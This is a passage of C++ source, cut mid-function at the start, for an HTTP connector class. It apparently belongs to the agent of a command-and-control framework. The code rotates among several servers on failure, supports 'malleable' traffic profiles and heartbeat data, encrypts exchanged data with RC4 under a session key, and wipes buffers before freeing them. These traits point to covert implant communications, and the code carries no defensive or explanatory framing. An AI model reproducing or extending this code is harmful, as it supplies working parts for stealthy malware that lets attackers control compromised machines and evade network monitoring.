					this->functions->InternetCloseHandle(hRequest);
				}
			}

			attempt++;
			if (!connected) {
				if (this->hConnect) {
					this->functions->InternetCloseHandle(this->hConnect);
					this->hConnect = NULL;
				}
				if (this->hInternet) {
					this->functions->InternetCloseHandle(this->hInternet);
					this->hInternet = NULL;
				}

				this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
				this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);

				this->server_index = (this->server_index + 1) % this->server_count;
			}

			// Rotate indices for next callback (active round-robin)
			RotateIndices();
		}
	}
}

BYTE* ConnectorHTTP::RecvData()
{
	if (this->recvData) {
		if (this->use_malleable)
			return this->recvData;
		return this->recvData + this->ans_pre_size;
	}
	return NULL;
}

int ConnectorHTTP::RecvSize()
{
	if (!this->recvData)
		return 0;
	if (this->use_malleable)
		return this->recvSize;
	if (this->recvSize < this->ans_size)
		return 0;

	return this->recvSize - this->ans_size;
}

void ConnectorHTTP::RecvClear()
{
	if (this->recvData && this->recvSize) {
		memset(this->recvData, 0, this->recvSize);
		this->functions->LocalFree(this->recvData);
		this->recvData = NULL;
	}
}

void ConnectorHTTP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
{
	if (plainData && plainSize > 0) {
		EncryptRC4(plainData, plainSize, sessionKey, 16);
		this->SendData(plainData, plainSize);
	}
	else {
		this->SendData(NULL, 0);
	}

	if (this->recvSize > 0 && this->recvData) {
		int dataSize = this->RecvSize();
		BYTE* dataPtr = this->RecvData();
		if (dataSize > 0 && dataPtr)
			DecryptRC4(dataPtr, dataSize, sessionKey, 16);
	}
}

void ConnectorHTTP::CloseConnector()
{
	if (this->m_profile) {
		malleable_profile_free((malleable_profile_t*)this->m_profile);
		this->m_profile = NULL;
	}

	if (this->beat_data) {
		memset(this->beat_data, 0, this->beat_size);
		this->functions->LocalFree(this->beat_data);
		this->beat_data = NULL;
		this->beat_size = 0;
	}

	if (this->headers) {
		DWORD l = StrLenA(this->headers);
		memset(this->headers, 0, l);
		this->functions->LocalFree(this->headers);
		this->headers = NULL;
	}

	this->functions->InternetCloseHandle(this->hInternet);
	this->functions->InternetCloseHandle(this->hConnect);
}
